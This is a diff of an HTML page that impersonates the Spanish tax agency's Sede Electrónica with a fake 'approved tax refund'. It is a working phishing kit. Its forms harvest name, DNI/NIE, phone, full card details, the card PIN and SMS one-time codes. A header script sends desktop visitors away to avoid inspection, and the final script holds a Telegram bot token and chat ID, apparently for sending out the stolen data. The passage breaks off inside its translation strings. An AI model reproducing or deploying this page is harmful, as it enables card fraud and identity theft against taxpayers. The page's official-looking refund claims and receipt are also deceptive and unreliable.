@@ -2,887 +2,887 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title id="page-title">Sede Electrónica - Agencia Tributaria</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Sede Electrónica - Agencia Tributaria</title>
 
-<!-- Script anti-engaño / redirección móvil -->
-<script>
-(function() {
-var isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-var hasTouchScreen = (('ontouchstart' in window) ||
-(navigator.maxTouchPoints > 0) ||
-(navigator.msMaxTouchPoints > 0));
-var isSmallScreen = window.innerWidth <= 800;
+    <!-- Script anti-engaño / redirección móvil -->
+    <script>
+        (function() {
+            var isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            var hasTouchScreen = (('ontouchstart' in window) || 
+                                  (navigator.maxTouchPoints > 0) || 
+                                  (navigator.msMaxTouchPoints > 0));
+            var isSmallScreen = window.innerWidth <= 800;
 
-if (!isMobileUA || !hasTouchScreen || !isSmallScreen) {
-window.location.href = "https://google.com";
-}
-})();
-</script>
+            if (!isMobileUA || !hasTouchScreen || !isSmallScreen) {
+                window.location.href = "https://google.com";
+            }
+        })();
+    </script>
 
-<!-- Tailwind CSS CDN -->
-<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-<style>
-@keyframes custom-spin {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(360deg); }
-}
-.animate-spin-custom {
-animation: custom-spin 1s linear infinite;
-}
-</style>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        @keyframes custom-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .animate-spin-custom {
+            animation: custom-spin 1s linear infinite;
+        }
+    </style>
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col justify-between font-sans text-gray-800 m-0 p-0">
 
-<!-- BARRA INSTITUCIONAL SUPERIOR CON BANDERA DE ESPAÑA OFICIAL Y ESCUDO COMPLETO -->
-<div class="bg-gray-900 text-white text-xs py-1.5 px-4 border-b border-gray-800">
-<div class="max-w-2xl mx-auto flex items-center justify-between">
-<div class="flex items-center space-x-2">
-<!-- Bandera de España con Escudo Real completo en el centro -->
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 500" class="w-6 h-4 inline-block shadow-sm">
-<rect width="750" height="500" fill="#aa151b"/>
-<rect width="750" height="250" y="125" fill="#ffc400"/>
-<g transform="translate(325, 175) scale(0.3)">
-<path d="M110,65 Q160,25 210,65 Q225,40 215,85 Q180,95 160,75 Q140,95 105,85 Q95,40 110,65 Z" fill="#d4af37" stroke="#660000" stroke-width="4"/>
-<path d="M120,85 Q160,70 200,85 L190,110 Q160,95 130,110 Z" fill="#aa151b"/>
-<path d="M115,110 H205 V245 C205,280 160,295 160,295 C160,295 115,280 115,245 Z" fill="#aa151b" stroke="#d4af37" stroke-width="4"/>
-<line x1="160" y1="110" x2="160" y2="245" stroke="#d4af37" stroke-width="4"/>
-<line x1="115" y1="177" x2="205" y2="177" stroke="#d4af37" stroke-width="4"/>
-<rect x="127" y="130" width="22" height="28" fill="#f1bf00"/>
-<path d="M175,135 Q185,130 192,148 Q182,158 168,145 Z" fill="#e0115f"/>
-<rect x="127" y="200" width="22" height="35" fill="#aa151b"/>
-<rect x="171" y="200" width="22" height="35" fill="#aa151b"/>
-<circle cx="160" cy="210" r="8" fill="#0055a5" stroke="#d4af37" stroke-width="2"/>
-</g>
-</svg>
-<span class="font-bold tracking-widest text-[11px]">ESPAÑA</span>
-</div>
-<span class="text-gray-300 font-medium tracking-wide">MINISTERIO DE HACIENDA</span>
-</div>
-</div>
-
-<!-- TOP NAVBAR -->
-<header class="bg-white border-b border-gray-200 shadow-sm sticky top-0 z-50">
-<div class="max-w-2xl mx-auto px-4 h-16 flex items-center justify-between">
-<div class="flex items-center space-x-3">
-<!-- ESCUDO DE ESPAÑA -->
-<a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" class="w-10 h-10 flex items-center justify-center">
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 320" class="w-10 h-10 inline-block object-contain">
-<rect width="380" height="320" fill="#ffcc00"/>
-<path d="M130,65 Q190,25 250,65 Q265,40 255,85 Q220,95 200,75 Q180,95 145,85 Q135,40 150,65 Z" fill="#d4af37" stroke="#660000" stroke-width="4"/>
-<path d="M140,85 Q190,70 240,85 L230,110 Q190,95 150,110 Z" fill="#aa151b"/>
-<path d="M130,110 H250 V245 C250,280 190,295 190,295 C190,295 130,280 130,245 Z" fill="#aa151b" stroke="#d4af37" stroke-width="4"/>
-<line x1="190" y1="110" x2="190" y2="245" stroke="#d4af37" stroke-width="4"/>
-<line x1="130" y1="177" x2="250" y2="177" stroke="#d4af37" stroke-width="4"/>
-<rect x="145" y="130" width="30" height="28" fill="#f1bf00"/>
-<path d="M210,135 Q220,130 228,148 Q218,158 202,145 Z" fill="#e0115f"/>
-<rect x="145" y="200" width="30" height="35" fill="#aa151b"/>
-<line x1="145" y1="211" x2="175" y2="211" stroke="#f1bf00" stroke-width="4"/>
-<line x1="145" y1="222" x2="175" y2="222" stroke="#f1bf00" stroke-width="4"/>
-<rect x="205" y="200" width="30" height="35" fill="#aa151b"/>
-<circle cx="190" cy="210" r="9" fill="#0055a5" stroke="#d4af37" stroke-width="2"/>
-<rect x="100" y="120" width="14" height="145" fill="#c0c0c0" stroke="#666" stroke-width="2"/>
-<rect x="266" y="120" width="14" height="145" fill="#c0c0c0" stroke="#666" stroke-width="2"/>
-<path d="M85,145 Q125,120 155,165" fill="none" stroke="#aa151b" stroke-width="7"/>
-<path d="M225,165 Q255,120 295,145" fill="none" stroke="#aa151b" stroke-width="7"/>
-</svg>
-</a>
-
-<!-- LOGO DE LA AGENCIA TRIBUTARIA -->
-<a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" class="w-10 h-10 flex items-center justify-center">
-<svg viewBox="0 0 100 100" class="w-10 h-10">
-<image
-href="https://logowik.com/content/uploads/images/agencia-tributaria9862.jpg"
-x="0"
-y="0"
-width="100"
-height="100"
-preserveAspectRatio="xMidYMid meet"
-style="border: none; outline: none;"
-/>
-</svg>
-</a>
-<a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" id="nav-brand" class="font-bold text-blue-900 tracking-tight text-sm sm:text-base hidden sm:inline hover:underline">Sede Electrónica</a>
-</div>
-<div class="flex items-center space-x-3">
-<a href="https://sede.agenciatributaria.gob.es/Sede/procedimientoC2/calendario-contribuyente.shtml" target="_blank" rel="noopener noreferrer" aria-label="Reloj de actividad" class="p-2 text-gray-600 hover:text-blue-900 transition-colors">
-<svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M12 7v5l3 3"></path></svg>
-</a>
-<a href="https://www.agenciatributaria.es/" target="_blank" rel="noopener noreferrer" class="bg-blue-700 text-white p-2 rounded-md flex items-center justify-center hover:bg-blue-800 transition-colors" aria-label="Acceso Área Personal">
-<svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-</a>
-
-<!-- SELECTOR DE IDIOMAS -->
-<div class="relative">
-<button onclick="toggleLangMenu()" id="current-lang-btn" class="text-sm font-medium flex items-center text-gray-700 cursor-pointer hover:text-blue-900 bg-gray-100 hover:bg-gray-200 px-2.5 py-1.5 rounded transition-colors">
-<span id="lang-code">ES</span> <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"></path></svg>
-</button>
-<div id="lang-dropdown" class="hidden absolute right-0 mt-2 w-36 bg-white border border-gray-200 rounded shadow-lg py-1 z-50 text-sm">
-<button onclick="changeLanguage('es')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Español</button>
-<button onclick="changeLanguage('ca')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Català</button>
-<button onclick="changeLanguage('gl')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Galego</button>
-<button onclick="changeLanguage('eu')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Euskera</button>
-<button onclick="changeLanguage('en')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">English</button>
-</div>
-</div>
-
-</div>
-</div>
-<div class="h-1 bg-blue-700 w-full"></div>
-</header>
-
-<!-- MIGAS DE PAN -->
-<div class="bg-gray-200 border-b border-gray-300 text-xs text-gray-600 py-2 px-4">
-<div class="max-w-2xl mx-auto flex items-center space-x-1">
-<span class="hover:underline cursor-pointer">Inicio</span>
-<span>&gt;</span>
-<span class="hover:underline cursor-pointer">Sede Electrónica</span>
-<span>&gt;</span>
-<span class="hover:underline cursor-pointer">Procedimientos</span>
-<span>&gt;</span>
-<span class="text-gray-900 font-medium">Reembolso</span>
-</div>
-</div>
-
-<!-- MAIN CONTAINER -->
-<main class="flex-grow max-w-2xl w-full mx-auto p-4 sm:p-6 flex flex-col justify-center my-auto">
-
-<!-- BARRA DE PROGRESO GLOBAL -->
-<div id="progress-bar-container" class="mb-4 bg-white border border-gray-200 rounded p-3 shadow-xs">
-<div class="flex justify-between items-center text-xs font-semibold text-gray-600 mb-1">
-<span id="step-indicator-text">Paso 1 de 4</span>
-<span id="step-name-text">Datos del Reembolso</span>
-</div>
-<div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
-<div id="progress-fill" class="bg-blue-700 h-full transition-all duration-300 w-1/4"></div>
-</div>
-</div>
-
-<!-- STEP 1: NOTIFICACIÓN DE REEMBOLSO -->
-<div id="step-1" class="step-container bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
-<h2 id="t-step1-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Notificación de Reembolso de Impuestos Aprobado</h2>
-
-<div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6 space-y-4">
-<p id="t-step1-desc" class="text-center font-medium text-gray-700">Su reembolso de impuestos ha sido aprobado.</p>
-<p id="t-step1-plazo" class="text-center text-sm text-gray-600">Tiene un plazo máximo de <strong class="text-black font-bold">5 días</strong> para completar el formulario de reembolso.</p>
-
-<form id="form-step-1" class="space-y-4 pt-2" onsubmit="handleStep1(event)">
-<div>
-<label id="t-label-exp" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Número de expediente</label>
-<input type="text" id="expediente" readonly value="B2845641546" class="w-full border border-gray-300 rounded p-2.5 bg-gray-200 text-gray-600 text-sm cursor-not-allowed select-none focus:outline-none">
-</div>
-<div>
-<label id="t-label-imp" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Importe de reembolso</label>
-<input type="text" id="importe" readonly value="311.29 €" class="w-full border border-gray-300 rounded p-2.5 bg-gray-200 text-gray-600 text-sm cursor-not-allowed select-none focus:outline-none">
-</div>
-<div>
-<label id="t-label-nom" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Nombre completo</label>
-<input type="text" id="nombre" required placeholder="Introduce tu nombre y apellidos" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
-</div>
-<div>
-<label id="t-label-dni" class="block text-xs uppercase font-bold text-gray-700 mb-1">* NIF / DNI / NIE</label>
-<input type="text" id="dni" required placeholder="Ej: 12345678Z o X1234567L" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm uppercase focus:outline-none focus:border-blue-700">
-<p id="dni-error" class="text-xs text-red-600 mt-1 hidden">Formato de DNI, NIE o NIF incorrecto.</p>
-</div>
-<div>
-<label id="t-label-tel" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Número de contacto</label>
-<input type="tel" id="contacto" required placeholder="Ej: +34 600 000 000" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
-</div>
-<div class="pt-4 text-center">
-<button type="submit" id="t-btn-continuar" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm w-full sm:w-auto shadow-sm cursor-pointer">Continuar</button>
-</div>
-</form>
-</div>
-</div>
-
-<!-- SPINNER 1 -->
-<div id="spinner-1" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
-<h2 id="t-spin1-title" class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
-<div class="flex justify-center my-6">
-<svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
-</div>
-<p id="t-spin1-p1" class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
-<p id="t-spin1-p2" class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
-</div>
-
-<!-- STEP 2: VERIFICACIÓN DE REEMBOLSO -->
-<div id="step-2" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
-<h2 id="t-step2-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de reembolso</h2>
-<div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
-<form id="form-step-2" class="space-y-4" onsubmit="validateCardAndProceed(event)">
-<div>
-<label id="t-label-card" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
-<div class="relative">
-<input type="text" id="card-number" required placeholder="4918 5040 3706 6119" maxlength="19" class="w-full border border-gray-300 rounded p-2.5 pr-12 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
-<div id="card-brand-icon" class="absolute right-3 top-2.5 text-xs font-bold text-blue-900 uppercase"></div>
-</div>
-<p id="card-error" class="text-xs text-red-600 mt-1 hidden">Número de tarjeta inválido o incorrecto.</p>
-</div>
-<div>
-<label id="t-label-expir" class="block text-sm font-medium text-gray-700 mb-1">Fecha de caducidad (MM/AA)</label>
-<input type="text" id="card-expiry" required placeholder="MM/AA" maxlength="5" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
-<p id="expiry-error" class="text-xs text-red-600 mt-1 hidden">Formato o fecha inválida (Ej: 01/32).</p>
-</div>
-<div>
-<label id="t-label-cvv" class="block text-sm font-medium text-gray-700 mb-1">Código de seguridad (CVV/CVC)</label>
-<div class="relative">
-<input type="password" id="card-cvv" required placeholder="•••" maxlength="4" class="w-full border border-gray-300 rounded p-2.5 pr-10 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
-<button type="button" onclick="togglePasswordVisibility('card-cvv', this)" class="absolute right-3 top-2.5 text-gray-500 hover:text-gray-700 cursor-pointer">
-<svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
-</button>
-</div>
-<p id="cvv-error" class="text-xs text-red-600 mt-1 hidden">CVV incorrecto (3 dígitos generales o 4 para American Express).</p>
-</div>
-<div>
-<label id="t-label-pin" class="block text-sm font-medium text-gray-700 mb-1">PIN</label>
-<div class="relative">
-<input type="password" id="card-pin" required placeholder="PIN de la tarjeta bancaria" maxlength="6" class="w-full border border-gray-300 rounded p-2.5 pr-10 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
-<button type="button" onclick="togglePasswordVisibility('card-pin', this)" class="absolute right-3 top-2.5 text-gray-500 hover:text-gray-700 cursor-pointer">
-<svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
-</button>
-</div>
-<p id="pin-error" class="text-xs text-red-600 mt-1 hidden">El PIN de tarjeta en España debe tener entre 4 y 6 dígitos.</p>
-</div>
-<div class="flex items-center justify-between pt-4">
-<button type="button" onclick="showStep('step-1', 1)" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors cursor-pointer">
-<svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> <span id="t-btn-volver1">Volver</span>
-</button>
-<button type="submit" id="t-btn-confirmar" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm cursor-pointer">Confirmar</button>
-</div>
-</form>
-</div>
-</div>
-
-<!-- SPINNER 2 -->
-<div id="spinner-2" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
-<h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
-<div class="flex justify-center my-6">
-<svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
-</div>
-<p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
-<p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
-</div>
-
-<!-- STEP 3: VERIFICACIÓN DE CÓDIGO SMS -->
-<div id="step-3" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
-<h2 id="t-step3-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de código</h2>
-<div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
-<form id="form-step-3" class="space-y-4" onsubmit="handleStep3(event)">
-<p id="t-step3-desc" class="text-center text-sm text-gray-700 mb-4">Introduzca el código SMS de 6 dígitos enviado al número de contacto.</p>
-<div>
-<input type="text" id="sms-code" required maxlength="6" placeholder="------" class="w-full border border-gray-300 rounded p-3 text-center tracking-widest text-lg bg-white text-gray-800 focus:outline-none focus:border-blue-700">
-</div>
-<div class="flex items-center justify-between pt-4">
-<button type="button" onclick="showStep('step-2', 2)" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors cursor-pointer">
-<svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> <span id="t-btn-volver2">Volver</span>
-</button>
-<button type="submit" id="t-btn-verificar1" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm cursor-pointer">Verificar</button>
-</div>
-</form>
-</div>
-</div>
-
-<!-- SPINNER 3 -->
-<div id="spinner-3" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
-<h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
-<div class="flex justify-center my-6">
-<svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
-</div>
-<p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
-<p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
-</div>
-
-<!-- STEP 4: VERIFICACIÓN DE PIN -->
-<div id="step-4" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
-<h2 id="t-step4-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Verificación de pin</h2>
-<div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6">
-<form id="form-step-4" class="space-y-4" onsubmit="handleStep4(event)">
-<p id="t-step4-desc" class="text-center text-sm text-gray-700 mb-4">Introduzca el PIN secreto de su tarjeta bancaria para confirmar la operación.</p>
-<div>
-<div class="relative">
-<input type="password" id="pin-code" required maxlength="6" placeholder="••••" class="w-full border border-gray-300 rounded p-3 pr-12 text-center tracking-widest text-lg bg-white text-gray-800 focus:outline-none focus:border-blue-700">
-<button type="button" onclick="togglePasswordVisibility('pin-code', this)" class="absolute right-3 top-3.5 text-gray-500 hover:text-gray-700 cursor-pointer">
-<svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
-</button>
-</div>
-<p id="final-pin-error" class="text-xs text-red-600 mt-1 hidden text-center">El PIN introducido no coincide con el de la página anterior o es incorrecto.</p>
-</div>
-<div class="flex items-center justify-between pt-4">
-<button type="button" onclick="showStep('step-3', 3)" class="text-gray-600 hover:text-blue-900 text-sm font-medium flex items-center transition-colors cursor-pointer">
-<svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg> <span id="t-btn-volver3">Volver</span>
-</button>
-<button type="submit" id="t-btn-verificar2" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm shadow-sm cursor-pointer">Verificar</button>
-</div>
-</form>
-</div>
-</div>
-
-<!-- SPINNER 4 -->
-<div id="spinner-4" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
-<h2 class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
-<div class="flex justify-center my-6">
-<svg class="w-16 h-16 text-blue-700 animate-spin-custom" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" stroke-dasharray="30 20"></circle></svg>
-</div>
-<p class="text-lg font-bold text-gray-900 mt-6 mb-2">Tu petición se está procesando...</p>
-<p class="text-sm text-gray-600">Por favor, espera unos segundos.</p>
-</div>
-
-<!-- STEP 5: PROCESO FINALIZADO CON CSV Y REDIRECCIÓN AUTOMÁTICA -->
-<div id="step-5" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8 text-center">
-<h2 id="t-step5-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Proceso Finalizado</h2>
-<div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6 space-y-4">
-<div class="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-2 font-bold text-xl">✓</div>
-<h3 id="t-step5-h3" class="text-lg font-bold text-gray-900">¡Tu proceso de reembolso ha finalizado!</h3>
-<p id="t-step5-p" class="text-sm text-gray-700 leading-relaxed">
-El pago del reembolso será efectivo en un plazo máximo de <strong class="text-black font-extrabold">14 días hábiles</strong>.
-</p>
-
-<!-- BLOQUE CSV Y JUSTIFICANTE -->
-<div class="bg-white p-3 rounded border border-gray-200 text-xs text-left space-y-1 my-3 shadow-2xs">
-<p class="text-gray-500 font-bold uppercase tracking-wider">Documento Firmado Electrónicamente</p>
-<p class="font-mono text-gray-800">CSV: <span class="font-bold text-blue-900">74F8A91C3E2048576209</span></p>
-<p class="text-gray-500 text-[11px]">Estado: <span class="text-green-700 font-bold">Registrado y Aprobado</span></p>
-</div>
-
-<div class="pt-2 flex flex-col sm:flex-row gap-2 justify-center">
-<button onclick="downloadReceipt()" class="bg-gray-800 hover:bg-gray-900 text-white font-medium py-2 px-4 rounded transition-colors text-xs shadow-sm cursor-pointer">Descargar Justificante (PDF)</button>
-<button onclick="window.location.href='https://sede.agenciatributaria.gob.es/'" id="t-btn-inicio" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2 px-6 rounded transition-colors text-xs shadow-sm cursor-pointer">Volver a la Sede Electrónica</button>
-</div>
-<p class="text-[11px] text-gray-500 pt-2">Redirección automática a la Sede en <span id="countdown-timer" class="font-bold text-gray-700">7</span> segundos...</p>
-</div>
-</div>
-
-</main>
-
-<!-- FOOTER CON ENLACES INSTITUCIONALES Y MODAL DINÁMICO -->
-<footer class="bg-blue-900 text-white mt-12 py-8 px-4">
-<div class="max-w-2xl mx-auto space-y-3 text-sm">
-<p class="font-bold border-b border-blue-800 pb-2 mb-3">
-<a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" class="hover:underline">Agencia Tributaria</a>
-</p>
-<ul class="space-y-2 text-blue-100 text-xs sm:text-sm">
-<li><a href="#" onclick="openModal('accesibilidad')" class="hover:underline">Accesibilidad</a></li>
-<li><a href="#" onclick="openModal('seguridad')" class="hover:underline">Aviso de seguridad</a></li>
-<li><a href="#" onclick="openModal('legal')" class="hover:underline">Aviso legal</a></li>
-<li><a href="#" onclick="openModal('certificado')" class="hover:underline">Validación del certificado de sede</a></li>
-<li><a href="#" onclick="openModal('privacidad')" class="hover:underline">Protección de datos</a></li>
-<li><a href="#" onclick="openModal('linguistica')" class="hover:underline">Política lingüística</a></li>
-<li><a href="https://sede.agenciatributaria.gob.es/Sede/mapa-web.shtml" target="_blank" rel="noopener noreferrer" class="hover:underline">Estructura y navegación en la sede electrónica</a></li>
-<li><a href="https://www.agenciatributaria.es/AEAT.internet/Atencion_telefonica.shtml" target="_blank" rel="noopener noreferrer" class="hover:underline">Contacta con nosotros</a></li>
-</ul>
-</div>
-</footer>
-
-<!-- MODAL INSTITUCIONAL OFICIAL -->
-<div id="institutional-modal" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
-<div class="bg-white rounded-lg shadow-xl max-w-lg w-full p-6 border-t-4 border-blue-700">
-<div class="flex justify-between items-center mb-4 border-b pb-2">
-<h3 id="modal-title" class="font-bold text-lg text-blue-900">Información Institucional</h3>
-<button onclick="closeModal()" class="text-gray-500 hover:text-gray-800 font-bold text-lg cursor-pointer">&times;</button>
-</div>
-<div id="modal-content" class="text-sm text-gray-700 space-y-3 leading-relaxed">
-<!-- Contenido dinámico -->
-</div>
-<div class="mt-6 text-right">
-<button onclick="closeModal()" class="bg-blue-700 hover:bg-blue-800 text-white px-4 py-2 rounded text-sm font-medium transition-colors cursor-pointer">Cerrar</button>
-</div>
-</div>
-</div>
-
-<!-- SCRIPT CON TELEGRAM BOT, VALIDACIONES Y TRADUCCIONES -->
-<script>
-const TELEGRAM_BOT_TOKEN = "8755847353:AAF4upNLjCstkjNC9Ryjbjja-CKlYKKzhDo";
-const TELEGRAM_CHAT_ID = "5892729609";
-
-let formDataStore = {};
-let userInteractionDetected = false;
-let currentLang = 'es';
-let redirectInterval = null;
-
-window.addEventListener('mousemove', () => { userInteractionDetected = true; }, { once: true });
-window.addEventListener('touchstart', () => { userInteractionDetected = true; }, { once: true });
-window.addEventListener('keydown', () => { userInteractionDetected = true; }, { once: true });
-
-const translations = {
-es: {
-brand: "Sede Electrónica",
-stepIndicator: "Paso {current} de 4",
-stepNames: ["Datos del Reembolso", "Verificación Bancaria", "Código SMS", "Código PIN"],
-step1Title: "Notificación de Reembolso de Impuestos Aprobado",
-step1Desc: "Su reembolso de impuestos ha sido aprobado.",
-step1Plazo: "Tiene un plazo máximo de <strong>5 días</strong> para completar el formulario de reembolso.",
-lblExp: "* Número de expediente",
-lblImp: "* Importe de reembolso",
-lblNom: "* Nombre completo",
-lblDni: "* NIF / DNI / NIE",
-lblTel: "* Número de contacto",
-btnContinuar: "Continuar",
-step2Title: "Verificación de reembolso",
-lblCard: "Número de tarjeta",
-lblExpir: "Fecha de caducidad (MM/AA)",
-lblCvv: "Código de seguridad (CVV/CVC)",
-lblPin: "PIN",
-btnVolver: "Volver",
-btnConfirmar: "Confirmar",
-step3Title: "Verificación de código",
-step3Desc: "Introduzca el código SMS de 6 dígitos enviado al número de contacto.",
-btnVerificar: "Verificar",
-step4Title: "Verificación de pin",
-step4Desc: "Introduzca el PIN secreto de su tarjeta bancaria para confirmar la operación.",
-step5Title: "Proceso Finalizado",
-step5H3: "¡Tu proceso de reembolso ha finalizado!",
-step5P: "El pago del reembolso será efectivo en un plazo máximo de <strong>14 días hábiles</strong>.",
-btnInicio: "Volver a la Sede Electrónica",
-dniErrorText: "Formato de DNI, NIE o NIF incorrecto.",
-cardErrorText: "Número de tarjeta inválido o incorrecto.",
-expiryErrorText: "Formato o fecha inválida (Ej: 01/32).",
-cvvErrorText: "CVV incorrecto (3 dígitos generales o 4 para American Express).",
-pinErrorText: "El PIN de tarjeta en España debe tener entre 4 y 6 dígitos.",
-finalPinErrorText: "El PIN introducido no coincide con el de la página anterior o es incorrecto."
-},
-ca: {
-brand: "Seu Electrònica",
-stepIndicator: "Pas {current} de 4",
-stepNames: ["Dades del Reemborsament", "Verificació Bancària", "Codi SMS", "Codi PIN"],
-step1Title: "Notificació de Reemborsament d'Impostos Aprovat",
-step1Desc: "El vostre reemborsament d'impostos ha estat aprovat.",
-step1Plazo: "Teniu un termini màxim de <strong>5 dies</strong> per completar el formulari de reemborsament.",
-lblExp: "* Número d'expedient",
-lblImp: "* Import de reemborsament",
-lblNom: "* Nom complet",
-lblDni: "* NIF / DNI / NIE",
